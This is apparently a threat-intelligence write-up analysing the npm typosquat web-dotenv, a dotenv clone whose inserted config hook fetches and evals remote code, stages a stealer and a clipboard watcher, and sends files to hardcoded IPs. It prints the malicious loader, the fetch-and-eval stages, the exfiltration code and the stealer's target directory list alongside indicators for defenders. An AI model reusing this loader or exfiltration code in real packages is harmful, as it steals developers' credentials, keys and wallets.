---
title: "web-dotenv: a dotenv typosquat that pulls its payload through jsonkeeper.com"
date: 2026-05-26
summary: "The npm package web-dotenv@1.0.2 is a near-byte-identical clone of motdotla/dotenv with a single inserted function. That function fetches an obfuscated loader from jsonkeeper.com, which npm-installs axios + socket.io-client into the temp directory and pulls a 110 KB third stage from 216.126.224.247 — a stealer that walks $HOME for wallet, key, and config files plus a clipboard watcher polling every 750 ms."
packageName: web-dotenv
ecosystem: npm
---

`dotenv` ships ~50M weekly downloads on npm. `web-dotenv` (one extra prefix) shipped to npm three days earlier from a fresh gmail. The tarball is fourteen files copied straight out of `motdotla/dotenv` — README, README-es, CHANGELOG, SECURITY, LICENSE, `lib/main.js`, `lib/env-options.js`, `lib/cli-options.js`, `config.js`, the `skills/dotenv/` and `skills/dotenvx/` directories, the lot. The `package.json` even points `repository.url` at `git://github.com/motdotla/dotenv.git`. Diffed against the upstream `dotenv` of the same vintage, `lib/main.js` differs by one function and one call to it.

Everything else is window dressing. The malicious surface is `config()` — the function any consumer calls as `require('web-dotenv').config()` on application boot.

## Stage 1: the inserted function

The diff against the cloned `dotenv` source is two lines. A new top-level helper:

<pre class="lang-js"><code><span class="tok-kw">function</span> <span class="tok-fn">configfix</span>() {
  <span class="tok-builtin">require</span>(<span class="tok-str">'axios'</span>).<span class="tok-fn">get</span>(<span class="tok-fn">atob</span>(<span class="tok-str">'CWh0dHBzOi8vd3d3Lmpzb25rZWVwZXIuY29tL2IvVktVTkk='</span>))
    .<span class="tok-fn">then</span>(r =&gt; { <span class="tok-fn">eval</span>(r.data.content); });
}
</code></pre>

…and a single call to it, wedged into the first line of `config()`:

<pre class="lang-js"><code><span class="tok-kw">function</span> <span class="tok-fn">config</span> (options) {
  <span class="tok-com">// fallback to fixed config</span>
  <span class="tok-fn">configfix</span>();
  <span class="tok-com">// fallback to original dotenv if DOTENV_KEY is not set</span>
  ...
}
</code></pre>

The base64 decodes to `\thttps://www.jsonkeeper.com/b/VKUNI` (note the leading tab — the obfuscation is barely above stylistic). `jsonkeeper.com` is a free anonymous JSON paste service; the bin returns `{"content":"<obfuscated JS>"}` which `eval` runs.

There is no `postinstall`. The chain fires on *application start*, the moment any code path reaches `dotenv.config()`. Registry scanners that look for `scripts.postinstall` see nothing. CI lockfile audits see nothing. The trigger is the most banal line in a Node app's `index.js`.

The author also iterated: `web-dotenv@1.0.0` (2026-05-22) shipped the entire Stage 2 obfuscator inline inside `configfix()`. Three days later, `1.0.2` outsourced it to jsonkeeper — smaller tarball, mutable payload, the body of `configfix()` now one line instead of two thousand characters. The intent of the change is in the diff.

| | Trait | What it caught |
| --- | --- | --- |
| <span class="sev-dot hostile" title="hostile"></span> | `command-and-control/stager/runtime/library-init` | Payload chain fires from `config()` on app start, not `postinstall` |
| <span class="sev-dot hostile" title="hostile"></span> | `command-and-control/dropper/delivery/paste-site` | `jsonkeeper.com/b/VKUNI` as Stage 2 host |
| <span class="sev-dot hostile" title="hostile"></span> | `defense-evasion/dynamic-code/eval/network` | `eval(r.data.content)` of a fetched HTTP body |
| <span class="sev-dot suspicious" title="suspicious"></span> | `anti-static/obfuscation/string/encoding` | `atob('CWh0dHBz…')` on a literal URL |
| <span class="sev-dot suspicious" title="suspicious"></span> | `initial-access/supply-chain/typosquat/npm` | One-prefix lookalike of `dotenv` |

## Stage 2: the jsonkeeper loader

The bin at `jsonkeeper.com/b/VKUNI` is 19 KB of obfuscator.io output — a 237-entry string array, an RC4-ish decoder, the usual array-rotation IIFE. Stepped through in an instrumented sandbox it does exactly two things:

<pre class="lang-js"><code><span class="tok-fn">execSync</span>(
  <span class="tok-str">'npm install axios socket.io-client --no-warnings --no-save --no-progress --loglevel silent'</span>,
  { windowsHide: <span class="tok-kw">true</span>, cwd: os.<span class="tok-fn">tmpdir</span>() }
);

<span class="tok-fn">require</span>(<span class="tok-str">'axios'</span>).<span class="tok-fn">get</span>(
  <span class="tok-str">'http://216.126.224.247/api/service/329f753d052f978a486cdce9896050bb'</span>
).<span class="tok-fn">then</span>(r =&gt; <span class="tok-fn">eval</span>(r.data));
</code></pre>

The hex tail `329f753d052f978a486cdce9896050bb` is the campaign / build identifier; it reappears as the `uid` field in every Stage-3 exfil packet. `--no-save` keeps `package.json` and `package-lock.json` clean; the dependencies land under `$TMPDIR/node_modules/` and are picked up by the eval'd Stage 3 via Node's parent-directory resolution. `socket.io-client` is pre-positioned but unused by Stage 3 as shipped — wiring for a future iteration.

The whole stage is a tee-up: install runtime deps the next stage will need, then fetch and run the next stage.

| | Trait | What it caught |
| --- | --- | --- |
| <span class="sev-dot hostile" title="hostile"></span> | `command-and-control/stager/dependency/runtime-install` | Silent `npm install` into `os.tmpdir()` |
| <span class="sev-dot hostile" title="hostile"></span> | `defense-evasion/dynamic-code/eval/network` | `eval` of HTTP body from a hardcoded IP |
| <span class="sev-dot suspicious" title="suspicious"></span> | `command-and-control/infrastructure/ip-port` | `http://216.126.224.247/` hardcoded, no DNS |
| <span class="sev-dot suspicious" title="suspicious"></span> | `discovery/campaign/identifier/uid` | `329f753d052f978a486cdce9896050bb` as campaign tag |
| <span class="sev-dot notable" title="notable"></span> | `anti-static/obfuscator-io/string-array/rc4` | Standard obfuscator.io string-array + RC4 decoder |

## Stage 3: stealer + clipper

The response body from `216.126.224.247` is 110 KB of the same obfuscator.io style. It writes two files to `os.tmpdir()` and detaches them:

<pre class="lang-js"><code>fs.<span class="tok-fn">writeFile</span>(path.<span class="tok-fn">join</span>(os.<span class="tok-fn">tmpdir</span>(), <span class="tok-str">'scdata'</span>), &lt;stealer&gt;);
fs.<span class="tok-fn">writeFile</span>(path.<span class="tok-fn">join</span>(os.<span class="tok-fn">tmpdir</span>(), <span class="tok-str">'ldata'</span>),  &lt;clipper&gt;);
<span class="tok-fn">exec</span>(<span class="tok-str">'node scdata'</span>, { cwd: os.<span class="tok-fn">tmpdir</span>(), windowsHide: <span class="tok-kw">true</span>, stdio: <span class="tok-str">'ignore'</span> });
<span class="tok-fn">exec</span>(<span class="tok-str">'node ldata'</span>,  { cwd: os.<span class="tok-fn">tmpdir</span>(), windowsHide: <span class="tok-kw">true</span>, stdio: <span class="tok-str">'ignore'</span> });
</code></pre>

Both files are themselves obfuscated. They are also passed inline a second time as `node -e '<source>'` to a `spawn()` call — a belt-and-braces fallback if the on-disk write fails. The two halves of the implant are independent.

### `scdata` — the file stealer

Walks the user's home directory (and on Windows every logical disk reported by `Get-CimInstance Win32_LogicalDisk | Select-Object -ExpandProperty DeviceID`) looking for files matching any of:

- Wallet / crypto patterns: `*metamask*`, `*bitcoin*`, `*btc*`, `*solana*`, `*private key*`, `*secret phrase*`, `*.dat`
- Secrets / config: `*.env*`, `*.pem`, `*.secret`, `*.key`, `*.json`, `*.yaml`, `*.yml`, `*.ini`, `*.sqlite`
- Documents: `*.pdf`, `*.docx`, `*.doc`, `*.xlsx`, `*.xls`, `*.csv`, `*.txt`, `*.md`, `*.rtf`, `*.odt`

…inside any of an explicit allow-list of high-value directories. The list reads like a tour of 2026 dev surfaces:

```
.aws  .azure  .ssh  .gnupg  .docker  .config  .cache
.cargo  .rustup  .cocoapods  .gemini  .claude  .cursor
.vscode  .vscode-server  .windsurf  .pearai  .vue-cli-ui
.brownie  .move  .sol  .eigent  .devctl  .pm2  .android
.steam  .snipaste  .yarn  .nvm  .node-gyp  .expo  .next
```

`.claude`, `.cursor`, `.windsurf`, `.pearai`, `.gemini`, `.eigent`, `.devctl` are the giveaway — this is targeting *AI-tool config and history* alongside the old hits. The Solana/Move/Brownie entries cover Web3 workspaces specifically. Each matching file is uploaded as `multipart/form-data` to:

<pre><code>POST http://216.126.224.220:5976/upload
</code></pre>

Note the separate IP — Stage 3 control lives at `.247`, bulk exfil at `.220:5976`. Both are the same `/22` (`216.126.224.0/22`), which is Tier.Net Technologies LLC; the operator is splitting roles across hosts in one rented range.

### `ldata` — the clipboard watcher

A tight loop that polls the clipboard every 750 ms via shell helpers:

<pre class="lang-js"><code><span class="tok-com">// darwin</span>
<span class="tok-fn">execSync</span>(<span class="tok-str">'pbpaste'</span>, { encoding: <span class="tok-str">'utf8'</span> });
<span class="tok-com">// win32</span>
<span class="tok-fn">execSync</span>(<span class="tok-str">'powershell -NoProfile -NonInteractive Get-Clipboard'</span>,
         { encoding: <span class="tok-str">'utf8'</span>, windowsHide: <span class="tok-kw">true</span> });
</code></pre>

Any change is debounced and POSTed back to the Stage-2 control endpoint:

<pre class="lang-js"><code>axios.<span class="tok-fn">post</span>(<span class="tok-str">'http://'</span> + <span class="tok-str">'216.126.224.247'</span> + <span class="tok-str">'/npm-compiler.log'</span>, {
  message: clipboardText,
  host:    os.<span class="tok-fn">hostname</span>(),
  uid:     <span class="tok-str">'329f753d052f978a486cdce9896050bb'</span>,
  t:       <span class="tok-str">'102'</span>
});
</code></pre>

It is not a clipboard *swapper* — the loop only reads and reports. Clipboard data on a developer workstation includes pasted secrets, fragments of `.env` files, copied wallet addresses, copied seed phrases. The exfil path is named `/npm-compiler.log` so any out-of-band glance at egress logs sees a plausible-looking POST URL.

| | Trait | What it caught |
| --- | --- | --- |
| <span class="sev-dot hostile" title="hostile"></span> | `collection/file-targeting/wallet/seed` | `*metamask*`, `*bitcoin*`, `*solana*`, `*secret phrase*`, `*.dat` globs |
| <span class="sev-dot hostile" title="hostile"></span> | `collection/file-targeting/ai-tooling/config` | `.claude`, `.cursor`, `.windsurf`, `.pearai`, `.gemini`, `.eigent` |
| <span class="sev-dot hostile" title="hostile"></span> | `credential-access/ssh-aws-azure/dotfile` | `.ssh`, `.aws`, `.azure`, `.gnupg`, `.docker` traversal |
| <span class="sev-dot hostile" title="hostile"></span> | `exfiltration/stealer/file/multipart-http` | `multipart/form-data` POST to `216.126.224.220:5976/upload` |
| <span class="sev-dot hostile" title="hostile"></span> | `collection/clipboard/poll/shell` | `pbpaste` + `powershell Get-Clipboard` polled every 750 ms |
| <span class="sev-dot suspicious" title="suspicious"></span> | `discovery/system/fingerprint/info` | `Get-CimInstance Win32_LogicalDisk … DeviceID` for drive enumeration |
| <span class="sev-dot suspicious" title="suspicious"></span> | `evasion/masquerade/path/log` | Exfil URL named `/npm-compiler.log` |
| <span class="sev-dot suspicious" title="suspicious"></span> | `command-and-control/infrastructure/ip-port` | Two hardcoded IPv4 endpoints, no DNS |

## Why this works

Three things, layered.

**The cover is the real package.** `web-dotenv` ships 99% of `dotenv`'s source verbatim, including the README banner, the Spanish translation, the CHANGELOG, and the `skills/` directory. Anyone reviewing the tarball sees a working `dotenv`. The diff is one function and one call.

**The trigger is runtime, not install.** Every prior post in this series (`api-rs-node`, `@devcarron/clob`, `system-user-identifier-cli`) detonates from `postinstall` — a flag every modern audit tool already looks at. `web-dotenv` does not. It detonates the first time any consumer reaches `dotenv.config()`. That moves the detection surface from "what does npm run on install" to "what does this library actually do when called," which is a much harder static-analysis problem and a much later runtime one.

**The payload is paste-hosted and mutable.** The on-disk Stage 1 in the tarball is fifteen lines and points at `jsonkeeper.com/b/VKUNI`. The operator can swap Stage 2 by editing one paste; they can swap Stage 3 by changing what `216.126.224.247/api/service/<uid>` returns. The version pinned in any victim's lockfile (`web-dotenv@1.0.2`) is permanently fresh. The 1.0.0 → 1.0.2 diff already shows the author doing exactly this — moving the inlined obfuscator out to the paste host between Sunday and Wednesday.

## Likely actor

| Field | Value |
| --- | --- |
| Publisher | `jean_dupont24 <jean.pierre.depont24@gmail.com>` |
| Account created | 2026-05-22 (same day as `web-dotenv@1.0.0`) |
| `1.0.0` published | `2026-05-22T14:15:09Z` (Stage 2 inline) |
| `1.0.2` published | `2026-05-25T15:05:35Z` (Stage 2 outsourced to jsonkeeper) |
| Campaign UID | `329f753d052f978a486cdce9896050bb` |
| Stage-2 host | `jsonkeeper.com/b/VKUNI` |
| Stage-3 host | `216.126.224.247` (Tier.Net Technologies LLC) |
| Bulk exfil host | `216.126.224.220:5976` (same `/22`) |

"Jean Dupont" is the French equivalent of "John Doe" — a placeholder name with a real-looking gmail behind it. The disposable publisher is consistent with the prior week's `shinydv412`/`devcarron` accounts. The technical signature is different though: those campaigns dropped a single PE binary; this one is pure JavaScript, AI-tool–aware in its targeting list, and runtime-triggered rather than install-time. Different author, different shop.

The campaign UID is also embedded in Stage 2's URL path, which means the operator is parametrizing per package or per build at the C2 — `web-dotenv@1.0.2` is one row in their tracker. The Stage-2 paste at jsonkeeper is shared by all of them; the per-campaign branching is downstream.

## Indicators

| Type | Value |
| --- | --- |
| Package | `web-dotenv@1.0.2` (npm), also `1.0.0` |
| npm page | [npmjs.com/package/web-dotenv](https://www.npmjs.com/package/web-dotenv) |
| Tarball SHA-256 (1.0.2) | `6401b9400fe94cc944d266fb39f1414e6e41a4c48317bd7a13d38df889f24ec6` |
| Tarball SHA-256 (1.0.0) | `c4f602914de9a106ab65300df233d0f15d29df19237ba3a70f2c86698e0b89c8` |
| `lib/main.js` SHA-256 (1.0.2) | `5cc30e2db46bb70e043b5f7fdb2d526caa2a4fcf83806c1c08bd6f0a1559ef43` |
| Stage 1 trigger | `require('web-dotenv').config()` → `configfix()` |
| Stage 2 URL | `https://www.jsonkeeper.com/b/VKUNI` (base64: `CWh0dHBzOi8vd3d3Lmpzb25rZWVwZXIuY29tL2IvVktVTkk=`) |
| Stage 2 SHA-256 (snapshot) | `7e672968591f290c62892d51682432363cf33264f9c6a602088b9b93efbe70bf` |
| Stage 3 URL | `http://216.126.224.247/api/service/329f753d052f978a486cdce9896050bb` |
| Stage 3 SHA-256 (snapshot) | `bf97b9f78cbbed6e3b7af7240b4f1019d05496f138202262964f7d8a7271fe4f` |
| Dropped stealer | `$TMPDIR/scdata` (SHA-256 `7c921e8acabce12825e12a7730912af63d0bed08700996b6e7389b9e96e1238b`) |
| Dropped clipper | `$TMPDIR/ldata` (SHA-256 `f3c3175bf05ccb6b97e371a451bba5a9d422aa7cfd6dbecb6f58c0cabfa6c5c1`) |
| File exfil C2 | `http://216.126.224.220:5976/upload` (multipart) |
| Clipboard exfil C2 | `http://216.126.224.247/npm-compiler.log` |
| Campaign UID | `329f753d052f978a486cdce9896050bb` |
| Publisher | `jean_dupont24 <jean.pierre.depont24@gmail.com>` |

## Response

Treat as runtime, not install-time. A clean `package-lock.json` and a clean `npm audit` mean nothing here — the trigger fires from `config()`. Grep dependency trees (yours and your customers') for `web-dotenv`. On any host that ran an app importing it since 2026-05-22, look for: `$TMPDIR/scdata`, `$TMPDIR/ldata`, the silent `npm install` of `axios` and `socket.io-client` into `$TMPDIR/node_modules/`, and outbound to `216.126.224.247` (any port) or `216.126.224.220:5976`. The `Get-CimInstance Win32_LogicalDisk` PowerShell call is a high-fidelity Windows endpoint signal — legitimate Node apps do not enumerate drives that way.

Rotate anything the dropped stealer would have shipped: SSH keys, AWS/Azure profile credentials, `.npmrc` tokens, `.env*` contents, GPG private keys, browser wallet seed files, Claude/Cursor/Windsurf/Codeium API tokens. Assume the clipboard for the runtime lifetime of the affected app is compromised — including anything pasted into a terminal while the process was alive.

Pull the Stage-2 paste from `jsonkeeper.com/b/VKUNI` and the Stage-3 body from `216.126.224.247/api/service/329f753d052f978a486cdce9896050bb` for your own analysis; both are mutable and may differ from the snapshots hashed above by the time you read this.
